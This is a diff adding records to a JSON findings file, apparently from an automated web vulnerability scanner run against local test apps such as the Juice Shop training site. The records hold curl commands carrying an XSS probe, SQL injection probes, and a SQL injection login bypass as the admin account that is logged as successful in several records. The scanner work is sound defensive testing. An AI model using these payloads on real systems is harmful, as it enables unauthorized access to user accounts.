@@ -38,5 +38,85 @@
     "curl_command": "curl -X GET 'http://localhost:4040/?URL_FRAGMENT=#/search?q=<img src=x onerror=alert(1)>'",
     "response_details": "DOM Sink Triggered with message: 1",
     "timestamp": "2026-03-09T18:52:59.234692"
+  },
+  {
+    "id": 5,
+    "job_id": 82,
+    "vuln_id": 9,
+    "payload": " AND 1=1-- -",
+    "screenshot_path": "",
+    "curl_command": "curl -X GET 'http://localhost:3000/?_rsc=vusbg?_rsc= AND 1=1-- -'",
+    "response_details": "",
+    "timestamp": "2026-03-10T04:35:29.441365"
+  },
+  {
+    "id": 6,
+    "job_id": 82,
+    "vuln_id": 10,
+    "payload": "' AND '1'='1#",
+    "screenshot_path": "",
+    "curl_command": "curl -X GET 'http://localhost:3000/register?_rsc=vusbg?_rsc=' AND '1'='1#'",
+    "response_details": "",
+    "timestamp": "2026-03-10T04:35:29.441365"
+  },
+  {
+    "id": 7,
+    "job_id": 86,
+    "vuln_id": 11,
+    "payload": "admin@juice-sh.op'--",
+    "screenshot_path": "fake_file_storage/img/job_86/finding_7/evidence_6dc70adb3a2647e0925dbe93921107a1.png",
+    "curl_command": "curl -X POST 'http://localhost:4040/#/login' -d 'username=admin@juice-sh.op'--'",
+    "response_details": "Successfully bypassed authentication using payload: admin@juice-sh.op'--. This allows unauthorized access to user accounts.",
+    "timestamp": "2026-03-10T16:43:28.161112"
+  },
+  {
+    "id": 8,
+    "job_id": 87,
+    "vuln_id": 11,
+    "payload": "admin@juice-sh.op'--",
+    "screenshot_path": "fake_file_storage/img/job_87/finding_8/evidence_a39cecedc315491799b8f15def65fae6.png",
+    "curl_command": "curl -X POST 'http://localhost:4040/#/login' -d 'username=admin@juice-sh.op'--'",
+    "response_details": "Successfully bypassed authentication using payload: admin@juice-sh.op'--. This allows unauthorized access to user accounts.",
+    "timestamp": "2026-03-10T16:48:38.569127"
+  },
+  {
+    "id": 9,
+    "job_id": 88,
+    "vuln_id": 11,
+    "payload": "admin@juice-sh.op'--",
+    "screenshot_path": "fake_file_storage/img/job_88/finding_9/evidence_26d20217efa641fbb5b1d66ea9a33526.png",
+    "curl_command": "curl -X POST 'http://localhost:4040/#/login' -d 'username=admin@juice-sh.op'--'",
+    "response_details": "Successfully bypassed authentication using payload: admin@juice-sh.op'--. This allows unauthorized access to user accounts.",
+    "timestamp": "2026-03-10T16:50:33.758319"
+  },
+  {
+    "id": 10,
+    "job_id": 89,
+    "vuln_id": 11,
+    "payload": "admin@juice-sh.op'--",
+    "screenshot_path": "fake_file_storage/img/job_89/finding_10/evidence_61dd1a5f32dc42559de9858b4e070785.png",
+    "curl_command": "curl -X POST 'http://localhost:4040/#/login' -d 'username=admin@juice-sh.op'--'",
+    "response_details": "Successfully bypassed authentication using payload: admin@juice-sh.op'--. This allows unauthorized access to user accounts.",
+    "timestamp": "2026-03-10T16:56:21.346039"
+  },
+  {
+    "id": 11,
+    "job_id": 90,
+    "vuln_id": 11,
+    "payload": "admin@juice-sh.op'--",
+    "screenshot_path": "fake_file_storage/img/job_90/finding_11/evidence_74c304f4b25347a3bff92018913bd8c8.png",
+    "curl_command": "curl -X POST 'http://localhost:4040/#/login' -d 'username=admin@juice-sh.op'--'",
+    "response_details": "Successfully bypassed authentication using payload: admin@juice-sh.op'--. This allows unauthorized access to user accounts.",
+    "timestamp": "2026-03-10T16:58:45.093879"
+  },
+  {
+    "id": 12,
+    "job_id": 91,
+    "vuln_id": 11,
+    "payload": "admin@juice-sh.op'--",
+    "screenshot_path": "fake_file_storage/img/job_91/finding_12/evidence_9638bd4527bf473fb76c9580bcf351f7.png",
+    "curl_command": "curl -X POST 'http://localhost:4040/#/login' -d 'username=admin@juice-sh.op'--'",
+    "response_details": "Successfully bypassed authentication using payload: admin@juice-sh.op'--. This allows unauthorized access to user accounts.",
+    "timestamp": "2026-03-10T17:01:46.354159"
   }
 ]
